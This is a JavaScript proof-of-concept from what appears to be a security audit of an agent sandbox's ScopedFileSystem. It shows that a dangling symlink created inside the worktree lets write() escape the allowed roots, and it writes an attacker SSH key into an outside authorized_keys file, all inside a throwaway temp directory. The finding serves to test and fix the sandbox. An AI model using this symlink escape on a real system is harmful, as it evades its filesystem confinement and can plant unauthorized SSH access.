// FINDING 1: ScopedFileSystem.write() escapes its roots through a DANGLING symlink.
import { mkdtempSync, mkdirSync, symlinkSync, existsSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ScopedFileSystem } from '../../packages/execution-core/dist/filesystem.js';

const sandbox = mkdtempSync(join(tmpdir(), 'tdm-fs-'));
const root = join(sandbox, 'worktree');
const outside = join(sandbox, 'HOME');
mkdirSync(root);
mkdirSync(outside);

// An agent running inside the worktree creates a symlink to a path that does
// not exist yet, outside the target roots. `realpath` fails on a dangling link,
// so nearestRealPath() falls back to the *lexical* parent and the scope check
// passes.
symlinkSync(join(outside, 'authorized_keys'), join(root, 'escape'));

const fs = new ScopedFileSystem(root);

console.log('roots            :', fs.roots);

// (a) reading an EXISTING outside file is correctly denied -----------------
symlinkSync(outside, join(root, 'existing-link'));
try {
  await fs.resolve('existing-link/whatever');
  console.log('resolve(existing symlink) : NOT DENIED  <-- unexpected');
} catch (e) {
  console.log('resolve(existing symlink) : denied ok  ->', e.code);
}

// (b) writing through a DANGLING symlink is allowed ------------------------
try {
  const resolved = await fs.resolve('escape');
  console.log('resolve("escape")         : ALLOWED ->', resolved);
} catch (e) {
  console.log('resolve("escape")         : denied ->', e.message);
}

await fs.write('escape', 'ssh-rsa AAAA... attacker@host\n');

const victim = join(outside, 'authorized_keys');
console.log('wrote outside the roots?  :', existsSync(victim));
if (existsSync(victim)) console.log('content at', victim, '=>', JSON.stringify(readFileSync(victim, 'utf8')));

// (c) the same trick through a directory symlink fails on mkdir (ENOTDIR),
//     so the exploitable shape is the single-file write above.

rmSync(sandbox, { recursive: true, force: true });
